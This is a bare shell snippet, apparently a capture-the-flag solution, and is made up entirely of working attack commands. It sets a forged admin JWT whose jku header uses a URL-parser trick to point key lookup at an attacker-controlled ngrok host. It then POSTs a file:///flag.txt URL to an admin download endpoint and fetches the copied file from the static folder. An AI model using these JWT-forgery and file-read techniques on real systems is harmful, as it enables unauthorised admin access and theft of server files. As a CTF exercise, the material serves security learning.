T="eyJhbGciOiJSUzI1NiIsImtpZCI6ImV2aWwiLCJ0eXAiOiJKV1QifQ.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOnRydWUsImprdSI6Imh0dHBzOi8veEBsb2NhbGhvc3Q6NTAwMEBwc2V1ZG9zY2hvbGFzdGljYWxseS1zZWRpbWVudG9sb2dpYy1naWxiZXJ0ZS5uZ3Jvay1mcmVlLmRldi9qd2tzLmpzb24ifQ.U-omXVFcIvAMI5KTQxyz2xC3-9UQt0uGnzlUfuZSNKjlr5CKF_nkdwNJ7hnABNOcscqaql4DnGIkQCoB_8KUjMVkTMVQ0aE6jhCYRLPd8Wy27xQRJquxFGMqaE9UmOgHL-3_0xz1Gj7utr-MxYfEhxnJyeEHAAKZcvIUjjyo8MNmN8N2-wocD5JURfI-9yJddyjJyqPpBvT6mXIYevqLg_1rzKPg8Ratr-Xir5ehinbHToT_7JG-pRcVH8OkB2Dz1J705HEMmWvVcG8CI-xK8OYT4NZ5OWKx_p6Vmyd3Ph8bltCDFmBY6tDl1G3vuXJAgE6BjiDZCB896wpHsPZQFQ"
curl -sX POST -H "Authorization: Bearer $T" -H "Content-Type: application/json" \
  -d '{"url":"{file}:///flag.txt","filename":"flag.txt","title":"flag","type":"image"}' \
  http://challenges.1pc.tf:27768/api/admin/download

curl -s http://challenges.1pc.tf:27768/static/flag.txt
